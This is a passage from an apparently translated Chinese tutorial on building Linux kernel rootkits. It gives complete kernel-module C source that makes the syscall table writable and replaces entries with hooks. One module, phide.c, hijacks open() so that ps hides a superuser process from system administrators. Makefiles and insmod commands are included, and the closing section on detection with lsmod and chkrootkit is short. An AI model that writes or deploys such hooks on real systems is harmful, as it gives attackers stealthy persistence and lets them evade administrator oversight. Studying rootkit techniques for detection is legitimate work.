    /*MY sys_call_table address*/
    //ffffffff81601680
    void **system_call_table_addr;
    /*my custom syscall that takes process name*/
    asmlinkage int (*custom_syscall) (char* name);
    /*hook*/
    asmlinkage int captain_hook(char* play_here) {
        /*do whatever here (print "HAHAHA", reverse their string, etc)
            But for now we will just print to the dmesg log*/
        printk(KERN_INFO "Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!");
        return custom_syscall(play_here);
    }
    /*Make page writeable*/
    int make_rw(unsigned long address){
        unsigned int level;
        pte_t *pte = lookup_address(address, &level);
        if(pte->pte &~_PAGE_RW){
            pte->pte |=_PAGE_RW;
        }
        return 0;
    }
    /* Make the page write protected */
    int make_ro(unsigned long address){
        unsigned int level;
        pte_t *pte = lookup_address(address, &level);
        pte->pte = pte->pte &~_PAGE_RW;
        return 0;
    }
    static int __init entry_point(void){
        printk(KERN_INFO "Captain Hook loaded successfully..n");
        /*MY sys_call_table address*/
        system_call_table_addr = (void*)0xffffffff81601680;
        /* Replace custom syscall with the correct system call name (write,open,etc) to hook*/
        custom_syscall = system_call_table_addr[__NR_pname];
        /*Disable page protection*/
        make_rw((unsigned long)system_call_table_addr);
        /*Change syscall to our syscall function*/
        system_call_table_addr[__NR_pname] = captain_hook;
        return 0;
    }
    static int __exit exit_point(void){
            printk(KERN_INFO "Unloaded Captain Hook successfullyn");
        /*Restore original system call */
        system_call_table_addr[__NR_pname] = custom_syscall;
        /*Renable page protection*/
        make_ro((unsigned long)system_call_table_addr);
        return 0;
    }
    module_init(entry_point);
    module_exit(exit_point);
你可能已经注意到__NR_pname，它代表数字，即pname的系统调用的编码。别忘了我们已经将该系统调用添加到syscall_64.tbl（tbl =
table duhh）中。
我们赋予它一个数字、一个名称和函数名。在这里，我们使用的是其名称（pname）。它将拦截pname系统调用，并且每成功一次就打印一次dmesg。
**创建Makefile：**
我们必须创建另一个Makefile，具体方法就像我们在创建系统调用时所做的一样，但由于这里是一个模块，所以会有一点不同：
    nano Makefile
    obj-m += captainHook.o
    all:
            make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
    clean:
            make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
**在加载到运行中的内核后测试该hook：**
现在万事俱备，只剩下编译了。对其进行编译的时候，绝对不会像编译内核那样费时，因为它只是一个模块而已。为此，只需键入下列命令：
    make
很好，你现在应该多了一些其他文件，而我们想要的是.ko文件：
现在打开另一个终端，键入以下命令以清除dmesg，然后插入该模块并运行testPname，并跟踪其输出：
第一个终端:
    dmesg -c
    dmesg -wH
第二个终端:
    insmod captainHook.ko
    cd ..
    ./testPname
    rmmod captainHook
    captainhookworks
经过一番努力，终于成功地创建了一个可以抓取系统调用（也就是rootkit）的钩子！想象一下，如果你的__NR_
pname是__NR_open或__NR_read会怎样？
您可以自己尝试一下，或继续阅读下一部分。不过，就这一点来说，有很多其他教程可资利用，例如：
**对系统管理命令“ps”隐身**
现在，让我们通过编程技术来实现对ps命令隐藏进程。首先，找到你想要隐藏的进程的PID，并想清楚你想让它伪装成哪个进程。就本例而言，我将用一个bash进程给su（sudo）进程打掩护，以便系统管理员看不到有人正在使用超级用户权限运行。
注意：Linux中的一切皆文件。例如“/proc/cpuinfo”文件存放的是CPU信息，内核版本位于“/proc/version”文件中。而“/proc/uptime”和“/proc/stat”文件则分别用来存放系统正常运行时间和空闲时间。当运行ps命令时，它实际上是打开进程的文件，以使用open()系统调用查看相关信息。当进程首次启动时，会使用系统调用write()将其写入具有相应PID＃的文件中。针对ps命令运行strace就能查找它们，或者查看它使用了哪些系统调用。
这里，我们将使用captainHook.c作为样板：
    nano phide.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    MODULE_LICENSE("GPL");
    MODULE_LICENSE("D0hnuts");
    /*MY sys_call_table address*/
    //ffffffff81601680
    void **system_call_table_addr;
    asmlinkage int (*original_open)(const char *pathname, int flags);
    asmlinkage int open_hijack(const char *pathname, int flags) {
        /*This hooks all  OPEN sys calls and check to see what the path of the file being opened is
        currently, the paths must be hard coded for the process you wish to hide, and the process you would like it to impersonate*/
        if(strstr(pathname, "/proc/2793/status") != NULL) {
            printk(KERN_ALERT "PS PROCESS HIJACKED %sn", pathname);
        //The new process location will be written into the syscall table for the open command, causing it to open a different file than the one originaly requested
            memcpy(pathname, "/proc/2794/status", strlen(pathname)+1);
        }
        return (*original_open)(pathname, flags);
    }
    //Make syscall table  writeable
    int make_rw(unsigned long address){
            unsigned int level;
            pte_t *pte = lookup_address(address, &level);
            if(pte->pte &~_PAGE_RW){
                    pte->pte |=_PAGE_RW;
            }
            return 0;
    }
    // Make the syscall table  write protected
    int make_ro(unsigned long address){
            unsigned int level;
            pte_t *pte = lookup_address(address, &level);
            pte->pte = pte->pte &~_PAGE_RW;
            return 0;
    }
    static int __init start(void){
            system_call_table_addr = (void*)0xffffffff81601680;
        //return the system call to its original state
            original_open = system_call_table_addr[__NR_open];
            //Disable page protection
            make_rw((unsigned long)system_call_table_addr);
            system_call_table_addr[__NR_open] = open_hijack;
            printk(KERN_INFO "Open psHook loaded successfully..n");
        return 0;
    }
    static int __exit end(void){
            //restore original system call
            system_call_table_addr[__NR_open] = original_open;
            //Enable syscall table  protection
            make_ro((unsigned long)system_call_table_addr);
        printk(KERN_INFO "Unloaded Open psHook successfullyn");
            return 0;
    }
    module_init(start);
    module_exit(end);
复制前面使用的Makefile，同时将顶部的"captainHook.o"替换为“phide.o”。
然后，输入下列命令
    make
以及
    insmod phide.ko (一定别忘了使用dmesg命令） :
如您所见，这里成功实现了隐身！除此之外，还可以使用这里介绍的方法来隐藏多个进程。
**如何防御？**
你可能注意到了，我这里只是使用另一个正在运行的进程来隐藏我们的进程。所以在PS表中会有重复的PID。这很容易被发现，但有一些方法可以完全隐藏它，我计划在未来的rootkit文章中加以介绍。
记得早些时候我提到的lsmod命令吗？ 它就可以列出在内核上运行的模块，效果具体如下图所示。
要想查看所有模块，可以使用：
    cat/proc/modules
因为rootkits通常在内存中待命，所以最好使用一个可以主动寻找rootkit的程序，例如：
    kbeast – https://volatility-labs.blogspot.ca/2012/09/movp-15-kbeast-rootkit-detecting-hidden.html
    chkroot – http://www.chkrootkit.org/
    kernel check – http://la-samhna.de/library/kern_check.c
**结束语**
我们希望本文能够帮您了解系统调用、内核空间和用户空间方面的相关知识。最重要的是，通过阅读本文，可以让您意识到钩住系统调用其实非常简单的事情，同时，也让您意识到只需少的可怜的编程技巧就足以让你为所欲为。当然，还有一些非常先进的rootkits类型，我们将后续的文章中陆续加以介绍。在下一篇文章中，我们介绍如何在无需查找PID的情况下隐藏进程。